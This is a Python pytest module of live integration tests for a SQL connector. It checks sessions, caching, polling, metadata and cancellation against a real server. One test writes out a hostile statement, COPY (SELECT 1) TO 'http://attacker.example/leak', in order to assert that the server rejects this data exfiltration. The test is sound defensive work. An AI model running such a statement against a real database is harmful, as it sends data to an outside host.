"""Live integration tests against a real DuckHaven with SQL sessions enabled.

Opt-in: skipped unless ``DUCKHAVEN_TEST_HOST``, ``DUCKHAVEN_TEST_WORKSPACE``, and
``DUCKHAVEN_TEST_PAT`` are set. Run with::

    make test-integration

The target server must have ``SQL_SESSIONS_ENABLED=true`` and the PAT's principal must be
a member of the workspace with at least one connected, compatible agent.
"""

import os
import uuid

import pytest

from duckhaven_sql_connector import ProgrammingError, ServerVersion, connect

pytestmark = pytest.mark.integration

HOST = os.environ.get("DUCKHAVEN_TEST_HOST")
WORKSPACE = os.environ.get("DUCKHAVEN_TEST_WORKSPACE")
TOKEN = os.environ.get("DUCKHAVEN_TEST_PAT")
AGENT = os.environ.get("DUCKHAVEN_TEST_AGENT") or None
CATALOG = os.environ.get("DUCKHAVEN_TEST_CATALOG") or None

if not (HOST and WORKSPACE and TOKEN):
    pytest.skip(
        "set DUCKHAVEN_TEST_HOST/WORKSPACE/PAT to run live integration tests",
        allow_module_level=True,
    )


@pytest.fixture(params=["session", "auto"])
def conn(request):
    connection = connect(
        host=HOST,
        workspace=WORKSPACE,
        token=TOKEN,
        agent=AGENT,
        catalog=CATALOG,
        mode=request.param,
    )
    try:
        yield connection
    finally:
        connection.close()


@pytest.fixture
def auto_conn():
    connection = connect(
        host=HOST, workspace=WORKSPACE, token=TOKEN, agent=AGENT, catalog=CATALOG, mode="auto"
    )
    try:
        yield connection
    finally:
        connection.close()


def test_auto_mode_reads_without_a_session(auto_conn):
    cur = auto_conn.cursor()
    cur.execute("SELECT 41 + ? AS n", [1])
    assert cur.fetchall() == [(42,)]
    assert auto_conn._session_id is None


def test_auto_mode_opens_a_session_for_state_and_keeps_it(auto_conn):
    cur = auto_conn.cursor()
    cur.execute("SET TimeZone = 'Europe/Budapest'")
    cur.execute("SELECT current_setting('TimeZone')")
    assert cur.fetchall() == [("Europe/Budapest",)]
    assert auto_conn._session_id is not None


def test_select_one(conn):
    cur = conn.cursor()
    cur.execute("SELECT 1 AS one")
    rows = cur.fetchall()
    assert rows == [(1,)]
    assert cur.description[0][0] == "one"


def test_multi_statement_session_reuse(conn):
    cur = conn.cursor()
    cur.execute("SELECT 1")
    assert cur.fetchall() == [(1,)]
    cur.execute("SELECT 2")
    assert cur.fetchall() == [(2,)]


def test_parameter_binding(conn):
    cur = conn.cursor()
    cur.execute("SELECT ? AS n, ? AS s", [7, "hi"])
    assert cur.fetchall() == [(7, "hi")]


def test_hostile_copy_is_rejected(conn):
    cur = conn.cursor()
    with pytest.raises(ProgrammingError):
        cur.execute("COPY (SELECT 1) TO 'http://attacker.example/leak'")


def test_statement_after_close_raises(conn):
    conn.close()
    with pytest.raises(ProgrammingError):
        conn.cursor()


def test_metadata_catalogs_and_tables(conn):
    cur = conn.cursor()
    cur.catalogs()
    catalogs = [row[0] for row in cur.fetchall()]
    assert isinstance(catalogs, list)  # at least the attached workspace catalogs

    cur.tables()
    assert cur.description is not None
    assert "table_name" in [col[0] for col in cur.description]


def test_server_version(conn):
    # Robust to either server generation: a server predating GET /api/version returns None,
    # a newer one returns a well-formed ServerVersion.
    version = conn.server_version()
    assert version is None or isinstance(version, ServerVersion)
    if version is not None:
        assert isinstance(version.version, str) and version.version
        assert isinstance(version.api_version, int)


def _count_status_polls(statement_wait):
    """Run one statement and count the GET /queries/{id} status calls it cost."""
    from duckhaven_sql_connector._telemetry import Hooks

    polls = []

    def on_request(method, path, status, duration):
        if method == "GET" and path.startswith("/queries/") and not path.endswith("/rows"):
            polls.append(path)

    connection = connect(
        host=HOST,
        workspace=WORKSPACE,
        token=TOKEN,
        agent=AGENT,
        catalog=CATALOG,
        statement_wait=statement_wait,
        # The server answers a repeated read from its result cache, with no status
        # polls at all -- which would make the "wait=0" arm look like the wait.
        use_cache=False,
        hooks=Hooks(on_request=on_request),
    )
    try:
        cur = connection.cursor()
        cur.execute("SELECT 1")  # warm the session; ignore its calls
        polls.clear()
        cur.execute("SELECT 42 AS n")
        assert cur.fetchall() == [(42,)]
        return len(polls)
    finally:
        connection.close()


def test_statement_wait_removes_the_status_poll_round_trips():
    """The behaviour the wait exists for, against a real server: a statement that
    finishes inside the budget costs no status polls at all.

    Unit tests can only prove the connector *stops* polling when handed a terminal
    submit response — that the server actually holds the call is a property of the
    pair, so it is asserted here. Skips against a server too old to know the field,
    which answers 202 immediately and polls exactly as it always did.
    """
    with_wait = _count_status_polls(30.0)
    if with_wait > 0:
        pytest.skip("server does not support wait_timeout_s on the statement call")
    without_wait = _count_status_polls(0)

    assert with_wait == 0
    assert without_wait >= 1, "wait_timeout_s=0 must restore submit-then-poll"


def test_the_first_page_arrives_on_the_submit_response():
    """One HTTP call per statement, against a real server.

    A unit test can only show the cursor skips its fetch when handed a page; that the
    server actually puts one there is a property of the pair. With pyarrow installed
    the page is the whole result as Arrow (`inline_format`). Skips against a server
    that supports neither, which answers without rows and costs two calls.
    """
    from duckhaven_sql_connector._telemetry import Hooks

    calls: list[tuple[str, str]] = []

    def on_request(method, path, status, duration):
        calls.append((method, path.split("?")[0]))

    connection = connect(
        host=HOST,
        workspace=WORKSPACE,
        token=TOKEN,
        agent=AGENT,
        catalog=CATALOG,
        use_cache=False,  # measure the executed path, not a cache hit
        hooks=Hooks(on_request=on_request),
    )
    try:
        cur = connection.cursor()
        cur.execute("SELECT 1")  # warm the session; ignore its calls
        calls.clear()
        cur.execute("SELECT 42 AS answer, 'x' AS s")
        assert cur.fetchall() == [(42, "x")]
        assert cur.description[0][0] == "answer"
        assert cur.rowcount == 1
        row_fetches = [p for m, p in calls if m == "GET" and p.endswith(("/rows", "/result"))]
        if row_fetches:
            pytest.skip("server does not return the rows on the statement response")
        assert len(calls) == 1, f"expected one HTTP call, got {calls}"
    finally:
        connection.close()


def _cache_status_of(connection, cursor):
    """What the result cache did with the cursor's last statement, as the server
    reports it on the query row; None against a server that predates the cache."""
    return connection._transport.get(f"/queries/{cursor.query_id}").json().get("cache_status")


def test_a_repeated_read_is_served_from_the_result_cache_unless_opted_out():
    """The server answers a read from its result cache when nothing it reads changed.

    Unit tests can only show the connector copes with a hit and sends the opt-out;
    that the server honours both is a property of the pair. A literal unique to this
    run keeps earlier runs' cache entries from answering the first call. Skips
    against a server that does not report `cache_status`.
    """
    sql = f"SELECT '{uuid.uuid4()}' AS cached"
    statuses = {}
    for label, use_cache in (("first", None), ("repeat", None), ("opted_out", False)):
        # A fresh session each time: the cache is shared by the workspace, not tied
        # to one connection.
        connection = connect(
            host=HOST,
            workspace=WORKSPACE,
            token=TOKEN,
            agent=AGENT,
            catalog=CATALOG,
            use_cache=use_cache,
        )
        try:
            cur = connection.cursor()
            cur.execute(sql)
            assert len(cur.fetchall()) == 1
            statuses[label] = _cache_status_of(connection, cur)
        finally:
            connection.close()

    if statuses["first"] is None:
        pytest.skip("server does not report a result cache status")
    assert statuses["repeat"] == "hit", statuses
    assert statuses["opted_out"] != "hit", statuses


def test_tags_and_the_query_id_are_recorded_on_the_run(conn):
    cur = conn.cursor()
    cur.execute("SELECT 1", tags={"suite": "connector-live"})
    run = conn._transport.get(f"/queries/{cur.query_id}").json()
    assert run["tags"] == {"suite": "connector-live"}


def test_metadata_lists_what_the_token_may_see(conn):
    catalogs = conn.metadata()
    assert catalogs and all({"name", "schemas"} <= set(c) for c in catalogs)
    if CATALOG:
        assert CATALOG in {c["name"] for c in catalogs}


def test_ping(conn):
    conn.ping()


def test_a_long_statement_can_be_cancelled_from_another_thread():
    import threading
    import time

    from duckhaven_sql_connector import OperationalError

    connection = connect(
        host=HOST,
        workspace=WORKSPACE,
        token=TOKEN,
        agent=AGENT,
        catalog=CATALOG,
        mode="auto",
        use_cache=False,
        # A server without chosen ids can only be reached once the submit returns.
        statement_wait=2.0,
    )
    cur = connection.cursor()
    outcome = {}

    def run():
        try:
            cur.execute("SELECT count(*) FROM range(100000000000) t(i) WHERE i % 7 = 3")
        except OperationalError as exc:
            outcome["error"] = exc

    worker = threading.Thread(target=run)
    worker.start()
    time.sleep(1.0)
    cur.cancel()
    worker.join(timeout=60)
    connection.close()
    assert not worker.is_alive()
    assert outcome["error"].code == "cancelled"
